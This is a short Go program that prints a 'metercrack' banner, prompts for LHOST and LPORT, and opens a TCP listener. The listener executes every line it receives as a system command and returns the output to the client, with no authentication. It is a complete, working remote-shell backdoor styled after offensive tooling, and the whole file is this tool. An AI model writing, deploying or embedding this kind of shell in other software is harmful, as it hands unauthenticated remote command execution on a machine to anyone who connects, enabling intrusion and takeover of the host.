package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
)

func printBanner() {
	// Check if running on Windows, and disable color if so
	var blue, reset string
	if runtime.GOOS == "windows" {
		// No color for Windows terminal
		blue, reset = "", ""
	} else {
		// ANSI escape codes for blue (for non-Windows OS)
		blue, reset = "\033[34m", "\033[0m"
	}

	// Banner text
	banner := `
 _ __ ___   ___| |_ ___ _ __ ___ _ __ __ _  ___| | __
| '_  _ \ / _ \ __/ _ \ '__/ __| '__/ _ |/ __| |/ /
| | | | | |  __/ ||  __/ | | (__| | | (_| | (__|   <
|_| |_| |_|\___|\__\___|_|  \___|_|  \__,_|\___|_\_\
	`

	// Print the banner with optional coloring
	fmt.Println(blue + banner + reset)
}

func main() {
	printBanner()

	// Get LHOST and LPORT from user input
	reader := bufio.NewReader(os.Stdin)

	fmt.Print("Enter LHOST (Local IP Address): ")
	LHOST, _ := reader.ReadString('\n')
	LHOST = strings.TrimSpace(LHOST)

	fmt.Print("Enter LPORT (Local Port): ")
	LPORT, _ := reader.ReadString('\n')
	LPORT = strings.TrimSpace(LPORT)

	// Create the listener address
	address := LHOST + ":" + LPORT
	fmt.Printf("\n[*] Listening on %s\n", address)

	// Start listening for incoming connections
	listener, err := net.Listen("tcp", address)
	if err != nil {
		fmt.Printf("[!] Error starting listener: %s\n", err)
		return
	}
	defer listener.Close()

	// Accept incoming connections
	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Printf("[!] Error accepting connection: %s\n", err)
			continue
		}
		// Handle the connection in a new goroutine
		go handleConnection(conn)
	}
}

func handleConnection(conn net.Conn) {
	// Print connection details
	fmt.Printf("[*] New connection from: %s\n", conn.RemoteAddr())

	// Close the connection when done
	defer conn.Close()

	// Send the initial prompt
	conn.Write([]byte("Welcome to the server! Type 'exit' to disconnect.\n"))
	conn.Write([]byte("Shell> "))

	// Initialize a reader to read from the connection
	reader := bufio.NewReader(conn)

	// Loop to handle command input from the client
	for {
		// Read command input from the client
		command, err := reader.ReadString('\n')
		if err != nil {
			fmt.Printf("[!] Error reading command: %s\n", err)
			break
		}

		// Trim newline from the command
		command = strings.TrimSpace(command)

		// Exit the shell if the client types "exit"
		if command == "exit" {
			conn.Write([]byte("Goodbye!\n"))
			break
		}

		// Execute the command on the server
		output, err := executeCommand(command)
		if err != nil {
			conn.Write([]byte(fmt.Sprintf("[!] Error: %s\n", err)))
		} else {
			conn.Write([]byte(output + "\n"))
		}

		// Send the prompt again
		conn.Write([]byte("Shell> "))
	}
}

// executeCommand runs a command on the server and returns its output
func executeCommand(command string) (string, error) {
	// Split the command into the executable and its arguments
	cmdParts := strings.Fields(command)
	if len(cmdParts) == 0 {
		return "", fmt.Errorf("no command provided")
	}

	cmd := exec.Command(cmdParts[0], cmdParts[1:]...)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("failed to execute command: %s", err)
	}

	return string(output), nil
}
